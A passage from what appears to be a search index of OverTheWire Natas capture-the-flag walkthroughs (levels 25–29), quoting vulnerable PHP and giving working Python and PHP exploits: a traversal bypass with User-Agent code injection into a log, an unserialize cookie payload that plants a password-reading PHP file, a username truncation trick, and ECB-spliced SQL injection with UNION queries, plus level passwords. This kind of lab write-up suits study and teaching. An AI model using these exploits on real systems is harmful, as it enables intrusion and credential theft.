cheers and &lt;3 to malvina\n// - morla\n\nfunction setLanguage()\n{\n    /* language setup */\n    if (array_key_exists(\"lang\", $_REQUEST))\n        if (safeinclude(\"language/\" . $_REQUEST[\"lang\"]))\n            return 1;\n    safeinclude(\"language/en\");\n}\n\nfunction safeinclude($filename)\n{\n    // check for directory traversal\n    if (strstr($filename, \"../\")) {\n        logRequest(\"Directory traversal attempt! fixing request.\");\n        $filename = str_replace(\"../\", \"\", $filename);\n    }\n    // dont let ppl steal our passwords\n    if (strstr($filename, \"natas_webpass\")) {\n        logRequest(\"Illegal file access detected! Aborting!\");\n        exit(-1);\n    }\n    // add more checks...\n\n    if (file_exists($filename)) {\n        include($filename);\n        return 1;\n    }\n    return 0;\n}\n\nfunction listFiles($path)\n{\n    $listoffiles = array();\n    if ($handle = opendir($path))\n        while (false !== ($file = readdir($handle)))\n            if ($file != \".\" &amp;&amp; $file != \"..\")\n                $listoffiles[] = $file;\n\n    closedir($handle);\n    return $listoffiles;\n}\n\nfunction logRequest($message)\n{\n    $log = \"[\" . date(\"d.m.Y H::i:s\", time()) . \"]\";\n    $log = $log . \" \" . $_SERVER['HTTP_USER_AGENT'];\n    $log = $log . \" \\\"\" . $message . \"\\\"\\n\";\n    $fd = fopen(\"/var/www/natas/natas25/logs/natas25_\" . session_id() . \".log\", \"a\");\n    fwrite($fd, $log);\n    fclose($fd);\n}\n?&gt;\n&lt;?php foreach(listFiles(\"language/\") as $f) echo \"&lt;option&gt;$f&lt;/option&gt;\"; ?&gt;\n&lt;?php\nsession_start();\nsetLanguage();\n\necho \"&lt;h2&gt;$__GREETING&lt;/h2&gt;\";\necho \"&lt;p align=\\\"justify\\\"&gt;$__MSG\";\necho \"&lt;div align=\\\"right\\\"&gt;&lt;h6&gt;$__FOOTER&lt;/h6&gt;&lt;div&gt;\";\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas25/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#observation","title":"Observation","text":"<p>User can control the value of <code>$_SERVER['HTTP_USER_AGENT']</code> and <code>$_REQUEST</code>. http://natas25.natas.labs.overthewire.org/language/en properly prints the php code. When accessing http://natas25.natas.labs.overthewire.org/logs/natas25_tpigqjsqu34iqeg3rcavtq3d2h.log, I got an internal server error. Accessing http://natas25.natas.labs.overthewire.org/natas/logs/natas25_refg9pem9ia3qh86tf2gd2gu2h.log gave us 404. The <code>include</code> function will print all the content in the included file, and treating the content in php code block as a part of code.</p>"},{"location":"CTFs/over-the-wire/natas/natas25/#plan","title":"Plan","text":"<p>Since the service did not fully block the relative file input. It just makes <code>../</code> be empty. Therefore, we can construct <code>....//</code> to make the processed string be <code>../</code>. One cannot construct a string containing <code>natas_passwd</code>, since the service will terminate.  Use <code>$_SERVER['HTTP_USER_AGENT']</code> to access the <code>natas_passwd</code>, and use <code>$_REQUEST</code> to access the log file.</p>"},{"location":"CTFs/over-the-wire/natas/natas25/#gathering-info","title":"Gathering Info","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#structure-of-directory","title":"Structure of Directory","text":"<p>Guess the language directory is under <code>/var/www/natas/natas25/natas25</code>.  Query <code>http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_refg9pem9ia3qh86tf2gd2gu2h.log</code> give us</p> <p>[13.02.2024 04::04:40] Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 \"Directory traversal attempt! fixing request.\"</p> <p>Great! It seems the plan would work.</p>"},{"location":"CTFs/over-the-wire/natas/natas25/#pwn","title":"Pwn","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#first-try","title":"First Try","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\nfrom requests.auth import HTTPBasicAuth\n\nusername = \"natas25\"\npassword = \"O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef get_content(response):\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    return content.__str__()\n\ndef main():\n    main_url = \"http://natas25.natas.labs.overthewire.org/\"\n    with open(\"./natas_pwn.php\", \"r\") as f:\n        header = {\n            \"User-Agent\": f.read(),\n        }\n    response = requests.get(main_url, auth=authentication, headers=header)\n    session_id = response.cookies[\"PHPSESSID\"]\n    log_file_path = \"?lang=....//logs/natas25_\" + session_id + \".log\"\n    response = requests.get(main_url+log_file_path, auth=authentication, cookies=response.cookies)\n    print(get_content(response))\n\nmain()\n</code></pre> Get </p> <p>[13.02.2024 04::16:02] python-requests/2.31.0 \"Directory traversal attempt! fixing request.\"</p> <p>User agent injection failed. Try to send the second request with the same header. Succeeded! </p>"},{"location":"CTFs/over-the-wire/natas/natas25/#final","title":"Final","text":"<p>script <pre><code>import requests\nfrom bs4 import BeautifulSoup\nfrom requests.auth import HTTPBasicAuth\n\nusername = \"natas25\"\npassword = \"O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef get_content(response):\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    return content.__str__()\n\ndef main():\n    main_url = \"http://natas25.natas.labs.overthewire.org/\"\n    with open(\"./natas_pwn.php\", \"r\") as f:\n        header = {\n            \"User-Agent\": f.read(),\n        }\n    req = requests.get(main_url, auth=authentication, headers=header)\n    session_id = response.cookies[\"PHPSESSID\"]\n    log_file_path = \"?lang=....//logs/natas25_\" + session_id + \".log\"\n    response = requests.get(main_url+log_file_path, auth=authentication, cookies=response.cookies, headers=header)\n    print(get_content(response))\n\nmain()\n</code></pre> payload (<code>natas_pwn.php</code>) <pre><code>&lt;?php echo fread(fopen(\"/etc/natas_webpass/natas26\", \"r\"),filesize(\"/etc/natas_webpass/natas26\")); ?&gt;\n</code></pre> 8A506rfIAXbKKk68yJeuTuRq4UfcK70k</p>"},{"location":"CTFs/over-the-wire/natas/natas25/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas25/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas26/","title":"natas 26 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#description","title":"Description","text":"<p>Username: natas26</p> <p>URL:      http://natas26.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas26/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n// sry, this is ugly as hell.\n// cheers kaliman ;)\n// - morla\n\nclass Logger\n{\n    private $logFile;\n    private $initMsg;\n    private $exitMsg;\n\n    function __construct($file)\n    {\n        // initialise variables\n        $this-&gt;initMsg = \"#--session started--#\\n\";\n        $this-&gt;exitMsg = \"#--session end--#\\n\";\n        $this-&gt;logFile = \"/tmp/natas26_\" . $file . \".log\";\n\n        // write initial message\n        $fd = fopen($this-&gt;logFile, \"a+\");\n        fwrite($fd, $this-&gt;initMsg);\n        fclose($fd);\n    }\n\n    function log($msg)\n    {\n        $fd = fopen($this-&gt;logFile, \"a+\");\n        fwrite($fd, $msg . \"\\n\");\n        fclose($fd);\n    }\n\n    function __destruct()\n    {\n        // write exit message\n        $fd = fopen($this-&gt;logFile, \"a+\");\n        fwrite($fd, $this-&gt;exitMsg);\n        fclose($fd);\n    }\n}\n\nfunction showImage($filename)\n{\n    if (file_exists($filename))\n        echo \"&lt;img src=\\\"$filename\\\"&gt;\";\n}\n\nfunction drawImage($filename)\n{\n    $img = imagecreatetruecolor(400, 300);\n    drawFromUserdata($img);\n    imagepng($img, $filename);\n    imagedestroy($img);\n}\n\nfunction drawFromUserdata($img)\n{\n    if (\n        array_key_exists(\"x1\", $_GET) &amp;&amp; array_key_exists(\"y1\", $_GET) &amp;&amp;\n        array_key_exists(\"x2\", $_GET) &amp;&amp; array_key_exists(\"y2\", $_GET)\n    ) {\n\n        $color = imagecolorallocate($img, 0xff, 0x12, 0x1c);\n        imageline(\n            $img,\n            $_GET[\"x1\"],\n            $_GET[\"y1\"],\n            $_GET[\"x2\"],\n            $_GET[\"y2\"],\n            $color\n        );\n    }\n\n    if (array_key_exists(\"drawing\", $_COOKIE)) {\n        $drawing = unserialize(base64_decode($_COOKIE[\"drawing\"]));\n        if ($drawing)\n            foreach ($drawing as $object)\n                if (\n                    array_key_exists(\"x1\", $object) &amp;&amp;\n                    array_key_exists(\"y1\", $object) &amp;&amp;\n                    array_key_exists(\"x2\", $object) &amp;&amp;\n                    array_key_exists(\"y2\", $object)\n                ) {\n\n                    $color = imagecolorallocate($img, 0xff, 0x12, 0x1c);\n                    imageline(\n                        $img,\n                        $object[\"x1\"],\n                        $object[\"y1\"],\n                        $object[\"x2\"],\n                        $object[\"y2\"],\n                        $color\n                    );\n                }\n    }\n}\n\nfunction storeData()\n{\n    $new_object = array();\n\n    if (\n        array_key_exists(\"x1\", $_GET) &amp;&amp; array_key_exists(\"y1\", $_GET) &amp;&amp;\n        array_key_exists(\"x2\", $_GET) &amp;&amp; array_key_exists(\"y2\", $_GET)\n    ) {\n        $new_object[\"x1\"] = $_GET[\"x1\"];\n        $new_object[\"y1\"] = $_GET[\"y1\"];\n        $new_object[\"x2\"] = $_GET[\"x2\"];\n        $new_object[\"y2\"] = $_GET[\"y2\"];\n    }\n\n    if (array_key_exists(\"drawing\", $_COOKIE)) {\n        $drawing = unserialize(base64_decode($_COOKIE[\"drawing\"]));\n    } else {\n        // create new array\n        $drawing = array();\n    }\n\n    $drawing[] = $new_object;\n    setcookie(\"drawing\", base64_encode(serialize($drawing)));\n}\n?&gt;\n\n&lt;?php\nsession_start();\nif (\n    array_key_exists(\"drawing\", $_COOKIE) ||\n    (array_key_exists(\"x1\", $_GET) &amp;&amp; array_key_exists(\"y1\", $_GET) &amp;&amp;\n        array_key_exists(\"x2\", $_GET) &amp;&amp; array_key_exists(\"y2\", $_GET))\n) {\n    $imgfile = \"img/natas26_\" . session_id() . \".png\";\n    drawImage($imgfile);\n    showImage($imgfile);\n    storeData();\n}\n\n?&gt;\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas26/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#observation","title":"Observation","text":"<p>Obviously, we can inject from <code>$_GET</code> and <code>$_COOKIE</code>. All the operations using <code>$_GET</code> samely uses <code>$_COOKIE</code>. Therefore, the attack would be undergone with cookie.  <code>imageline</code> and <code>unserialize</code> directly use the value of user provided cookie. From php manual, I could not get any vulnerabilities. However, there are lots of warnings in the unserialize page. That's it.</p>"},{"location":"CTFs/over-the-wire/natas/natas26/#plan","title":"Plan","text":"<p>By google, I found an article about unserialize. Set log file as the png file path or anything, and inject php code as exit message.</p>"},{"location":"CTFs/over-the-wire/natas/natas26/#pwn","title":"Pwn","text":"<pre><code>&lt;?php\nclass Logger\n{\n    private $logFile;\n    private $initMsg;\n    private $exitMsg;\n\n    function __construct($file)\n    {\n        // initialise variables\n        $this-&gt;initMsg = \"#--session started--#\\n\";\n        $this-&gt;exitMsg = \"&lt;?php echo file_get_contents(\\\"/etc/natas_webpass/natas27\\\"); ?&gt;\";\n        $this-&gt;logFile = \"/var/www/natas/natas26/img/sss.txt\";\n    }\n}\n$logger = new Logger(\"\");\n$arr = array();\n$arr[] = $logger;\necho base64_encode(serialize($arr));\n</code></pre> <p><pre><code>import requests\nfrom requests.auth import HTTPBasicAuth\n\nusername = \"natas26\"\npassword = \"8A506rfIAXbKKk68yJeuTuRq4UfcK70k\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef mal_cookie():\n    mal_serialized = \"\"\"YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvc3NzLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoIi9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Iik7ID8+Ijt9fQ==\"\"\"\n    mal_cookie = {\n        \"drawing\" : mal_serialized,\n    }\n    return mal_cookie\n\ndef main():\n    url = \"http://natas26.natas.labs.overthewire.org/\"\n    response = requests.get(url, auth=authentication, cookies=mal_cookie())\n\nmain()\n</code></pre> Accessing http://natas26.natas.labs.overthewire.org/img/sss.php will get PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3</p>"},{"location":"CTFs/over-the-wire/natas/natas26/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#noting","title":"Noting","text":"<ul> <li>Do not use python to generate the serialized data. It only offers pain and error. </li> <li>Use absolute path will give you higher chance to pwn.</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas26/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#reference","title":"Reference","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#-httpsgithubcomswisskyrepopayloadsallthethingsblobmasterinsecure20deserializationphpmd","title":"- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md","text":""},{"location":"CTFs/over-the-wire/natas/natas26/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas27/","title":"natas 27 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas27/#description","title":"Description","text":"<p>Username: natas27</p> <p>URL:      http://natas27.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas27/#source-code","title":"Source Code","text":"<pre><code>&lt;?php\n\n// morla / 10111\n// database gets cleared every 5 min\n\n\n/*\nCREATE TABLE `users` (\n  `username` varchar(64) DEFAULT NULL,\n  `password` varchar(64) DEFAULT NULL\n);\n*/\n\n\nfunction checkCredentials($link, $usr, $pass)\n{\n\n    $user = mysqli_real_escape_string($link, $usr);\n    $password = mysqli_real_escape_string($link, $pass);\n\n    $query = \"SELECT username from users where username='$user' and password='$password' \";\n    $res = mysqli_query($link, $query);\n    if (mysqli_num_rows($res) &gt; 0) {\n        return True;\n    }\n    return False;\n}\n\n\nfunction validUser($link, $usr)\n{\n\n    $user = mysqli_real_escape_string($link, $usr);\n\n    $query = \"SELECT * from users where username='$user'\";\n    $res = mysqli_query($link, $query);\n    if ($res) {\n        if (mysqli_num_rows($res) &gt; 0) {\n            return True;\n        }\n    }\n    return False;\n}\n\n\nfunction dumpData($link, $usr)\n{\n\n    $user = mysqli_real_escape_string($link, trim($usr));\n\n    $query = \"SELECT * from users where username='$user'\";\n    $res = mysqli_query($link, $query);\n    if ($res) {\n        if (mysqli_num_rows($res) &gt; 0) {\n            while ($row = mysqli_fetch_assoc($res)) {\n                // thanks to Gobo for reporting this bug!\n                //return print_r($row);\n                return print_r($row, true);\n            }\n        }\n    }\n    return False;\n}\n\n\nfunction createUser($link, $usr, $pass)\n{\n\n    if ($usr != trim($usr)) {\n        echo \"Go away hacker\";\n        return False;\n    }\n    $user = mysqli_real_escape_string($link, substr($usr, 0, 64));\n    $password = mysqli_real_escape_string($link, substr($pass, 0, 64));\n\n    $query = \"INSERT INTO users (username,password) values ('$user','$password')\";\n    $res = mysqli_query($link, $query);\n    if (mysqli_affected_rows($link) &gt; 0) {\n        return True;\n    }\n    return False;\n}\n\n\nif (array_key_exists(\"username\", $_REQUEST) and array_key_exists(\"password\", $_REQUEST)) {\n    $link = mysqli_connect('localhost', 'natas27', '&lt;censored&gt;');\n    mysqli_select_db($link, 'natas27');\n\n\n    if (validUser($link, $_REQUEST[\"username\"])) {\n        //user exists, check creds\n        if (checkCredentials($link, $_REQUEST[\"username\"], $_REQUEST[\"password\"])) {\n            echo \"Welcome \" . htmlentities($_REQUEST[\"username\"]) . \"!&lt;br&gt;\";\n            echo \"Here is your data:&lt;br&gt;\";\n            $data = dumpData($link, $_REQUEST[\"username\"]);\n            print htmlentities($data);\n        } else {\n            echo \"Wrong password for user: \" . htmlentities($_REQUEST[\"username\"]) . \"&lt;br&gt;\";\n        }\n    } else {\n        //user doesn't exist\n        if (createUser($link, $_REQUEST[\"username\"], $_REQUEST[\"password\"])) {\n            echo \"User \" . htmlentities($_REQUEST[\"username\"]) . \" was created!\";\n        }\n    }\n\n    mysqli_close($link);\n} else {\n}\n</code></pre>"},{"location":"CTFs/over-the-wire/natas/natas27/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas27/#observation","title":"Observation","text":"<p>First, I noticed that sql injection might be prevented by <code>mysqli_real_escape_string</code>. While digging information, I found a stackoverflow discussion which is marvelous. It shows the original answer and why the payload was constructed. Back to the topic, refer to that discussion, it seems to be impossible to bypass <code>mysqli_real_escape_string</code>.</p> <p>The last hope would be <code>htmlentities</code>. It seems that it can do nothing.</p>"},{"location":"CTFs/over-the-wire/natas/natas27/#get-a-hint","title":"Get a Hint","text":"<p>From this natas hint site. It says </p> <p>The username column is not defined as unique</p>"},{"location":"CTFs/over-the-wire/natas/natas27/#plan","title":"Plan","text":"<p>All we need to do is construct a username that would be <code>natas28</code> when it's store into the database. In other words, we need to meet a few conditions 1. <code>$usr != trim($usr)</code> 2. <code>mysqli_real_escape_string($link, substr($usr, 0, 64)) == 'natas28'</code> All the special characters we need can be found at php manual.</p>"},{"location":"CTFs/over-the-wire/natas/natas27/#pwn","title":"Pwn","text":"<p><pre><code>import requests\nfrom bs4 import BeautifulSoup\nfrom requests.auth import HTTPBasicAuth\n\nusername = \"natas27\"\npassword = \"PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef get_content(response):\n    soup = BeautifulSoup(response.text, 'html.parser')\n    content = soup.select('#content')\n    return content.__str__()\n\ndef main():\n    main_url = \"http://natas27.natas.labs.overthewire.org/\"\n    payload = {\n        \"username\" : \"natas28\" + \"\\0\"*63 + \"3\",\n        \"password\" : \"123\"\n    }\n    _ = requests.post(main_url, payload, auth=authentication)\n    payload = {\n        \"username\" : \"natas28\",\n        \"password\" : \"123\"\n    }\n    response = requests.post(main_url, payload, auth=authentication)\n    print(get_content(response))\n\nmain()\n</code></pre> skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4</p>"},{"location":"CTFs/over-the-wire/natas/natas27/#sql-trailing-spaces","title":"SQL Trailing Spaces","text":"<p>Although I got the password, that was achieved by chance, not a good plan nor clear understanding.</p> <p>How mySQL treats trailing spaces plays a significant role in this problem. By the document and my search, ![[mysql_ascii.png]] we know 1. For <code>PAD SPACE</code> collations, trailing spaces are insignificant in comparisons; strings are compared without regard to trailing spaces. 2. ascii is <code>PAD SPACE</code> collations in mysql Therefore, trailing spaces would be ignored. ![[mysql_trailing_spaces_comparison.png]]</p>"},{"location":"CTFs/over-the-wire/natas/natas27/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas27/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas27/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas27/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas27/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas28/","title":"natas 28 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas28/#description","title":"Description","text":"<p>Username: natas28</p> <p>URL:      http://natas28.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas28/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas28/#observation","title":"Observation","text":""},{"location":"CTFs/over-the-wire/natas/natas28/#payload","title":"Payload","text":"<p>After pressing search, the url turns into <code>search.php</code> with query. Therefore, directly check endpoint <code>search.php</code> page. Nothing but only <code>mep</code> three characters.</p> <p>Let us play with payload. Query with nothing offers </p> <p>Notice: Uninitialized string offset: -1 in\u00a0/var/www/natas/natas28/search.php\u00a0on line\u00a059 Zero padding found instead of PKCS#7 padding</p> <p>After collecting two search content, one can get two different queries. Extract the identical part. <code>G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP</code>. Use it in query.</p> <p>Notice: Trying to access array offset on value of type bool in\u00a0/var/www/natas/natas28/search.php\u00a0on line\u00a059 Zero padding found instead of PKCS#7 padding</p> <p>With some search, I found an attack exploiting the padding, i.e., [[padding oracle attack]]. In the example, this technique is applied on CBC. Therefore, we need to check the block. <pre><code>def extract_query(url: str):\n    parsed_url = urlparse(url)\n    captured_value = parse_qs(parsed_url.query)['query'][0]\n    return captured_value\n\ndef retrieve_queries():\n    for i in range(50):\n        main_url = \"http://natas28.natas.labs.overthewire.org/index.php\"\n        payload = {\n            \"query\" : \"vegetable\"+ str(i),\n        }\n        response = requests.post(main_url, auth=authentication, data=payload)\n        print(f\"{i} : {extract_query(response.url)}\")\n\nretrieve_queries()\n</code></pre> Fortunately, I think every block would generate a ciphertext with a length of 22 characters. Moreover, it might be ECB not CBC, since the result changes only in some parts but not all the following characters. <pre><code>38 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKgHAUWGVPjoODSBsJiKJzEkLLjc1SH4XdytO9O2yi2pcqM9OYQkTq645oGdhkgSlo=\n39 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKgHAUWGVPjoODSBsJiKJzEDKWsasNjmRfPW2n4Q5AJi8qM9OYQkTq645oGdhkgSlo=\n40 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLls2NGuivaJj7H9Gh39NKKjSIK5YYioto3e8rvAi/UwsqM9OYQkTq645oGdhkgSlo=\n41 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLls2NGuivaJj7H9Gh39NKKyzdjv0KNaoXsfXBKUOlzXcqM9OYQkTq645oGdhkgSlo=\n42 : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLls2NGuivaJj7H9Gh39NKKbgKivJnOqZsklwsoFwNeJMqM9OYQkTq645oGdhkgSlo=\n</code></pre> With manipulating the length of the query, I found the block size might be 16 characters long.</p> <p>Block size: 16 Ciphertext block size (in base64): 22 <pre><code>def retrieve_queries():\n    for i in range(50):\n        response = main_req(\"v\" * i)\n        print(f\"{i} : {extract_query(response.url)}\")\n</code></pre> The first block and the second block are all fixed. The third block is fixed after <code>i=10</code>. When <code>i=13</code>, the length of ciphertext changes. </p> <p>From all the ciphertext, I think the plaintext would be <code>prefix</code> + <code>payload</code> + <code>suffix</code>. Length - prefix : 16*2 + (16-10) = 38 - suffix : (16-(12-10))+16 = 30</p> <p>Since it seems to be ECB, [[padding oracle attack]] might be useless here.</p>"},{"location":"CTFs/over-the-wire/natas/natas28/#crack-suffix-meaningless","title":"Crack Suffix (Meaningless)","text":"<p><pre><code>import requests\nfrom requests.auth import HTTPBasicAuth\nfrom urllib.parse import urlparse\nfrom urllib.parse import parse_qs\nimport string\n\nusername = \"natas28\"\npassword = \"skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4\"\nauthentication = HTTPBasicAuth(username, password)\n\ndef main_req(query:str):\n    main_url = \"http://natas28.natas.labs.overthewire.org/index.php\"\n    payload = {\n        \"query\" : query,\n    }\n    response = requests.post(main_url, auth=authentication, data=payload)\n    return response\n\ndef extract_query(url: str):\n    parsed_url = urlparse(url)\n    captured_value = parse_qs(parsed_url.query)['query'][0]\n    return captured_value\n\ndef are_block3_same(query1, query2):\n    return query1[42:64] == query2[42:64]\n\ndef main():\n    success_password = \"\"\n    N = 10\n    while len(success_password) &lt; N:\n        length_success = len(success_password)\n        pure_payload = \"1\"*(N-length_success-1)\n        target_query = extract_query(main_req(pure_payload).url)\n        for candidate in string.printable:\n            manipulated_payload = \"1\"*(N-length_success-1) + success_password + candidate\n            manipulated_query = extract_query(main_req(manipulated_payload).url)\n            if are_block3_same(manipulated_query, target_query):\n                success_password += candidate\n                print(f\"{success_password}\")\n                break\n        else:\n            print(f\"password : {success_password}\")\n            break\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> password : % failed to find the suffix.</p>"},{"location":"CTFs/over-the-wire/natas/natas28/#special-characters","title":"Special Characters","text":"<p>However, try to add special (escape) character into payloads. <pre><code>def compare_queries():\n    response = main_req(\"1\"*9 + \"\\\\\")\n    print(f\"padding 1 : {extract_query(response.url)}\")\n    response = main_req(\"1\"*9 + \"'\")\n    print(f\"padding 2 : {extract_query(response.url)}\")\n    response = main_req(\"1\"*9 + \"\\\"\")\n    print(f\"padding 3 : {extract_query(response.url)}\")\n</code></pre> The differences between them are all in the fourth block. That means the plaintext in the third block are identical. It might be the characters should be escaped. </p> <p>Therefore, I guess the process is getting input from user \u2192 escape characters \u2192 ECB \u2192 request with encrypted payload \u2192 decrypt the payload \u2192 sql</p>"},{"location":"CTFs/over-the-wire/natas/natas28/#plan","title":"Plan","text":"<p>If the process is as I guessed, one can perform sql attack with malicious enrypted payload, that is, not escaped characters. <pre><code>if __name__ == \"__main__\":\n    response = main_req(\"2\"*9 + \"' OR 1=1 -- \")\n    last_part = extract_query(response.url)[64:]\n    response = main_req(\"2\"*10)\n    first_part = extract_query(response.url)[:64]\n    mal_query = first_part + last_part\n    response = requests.get(\"http://natas28.natas.labs.overthewire.org/search.php/?query=\"+quote(mal_query),\n                  auth=authentication)\n    print(get_content(response))\n</code></pre> Succeed! We need to get the info about users table. Therefore, we need to use [[union attack]]. <pre><code>\"' OR 1=1 ORDER BY 1-- \" ## determine the column of the original sql\n\"' UNION SELECT username FROM users-- \" ## get all the users, found only one\n\"' UNION SELECT password FROM users-- \" ## retrieve the password of the only user\n</code></pre> Finally, we get pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno</p>"},{"location":"CTFs/over-the-wire/natas/natas28/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas28/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas28/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas28/#techniques","title":"Techniques","text":"<ul> <li>[[union attack]]</li> </ul>"},{"location":"CTFs/over-the-wire/natas/natas28/#tools","title":"Tools","text":""},{"location":"CTFs/over-the-wire/natas/natas29/","title":"natas 29 walkthrough","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#description","title":"Description","text":"<p>Username: natas29</p> <p>URL:      http://natas29.natas.labs.overthewire.org</p>"},{"location":"CTFs/over-the-wire/natas/natas29/#progress","title":"Progress","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#observation","title":"Observation","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#hint","title":"Hint","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#solving","title":"Solving","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#category","title":"Category","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#techniques","title":"Techniques","text":""},{"location":"CTFs/over-the-wire/natas/natas29/#tools","title":"Tools","text":""}]}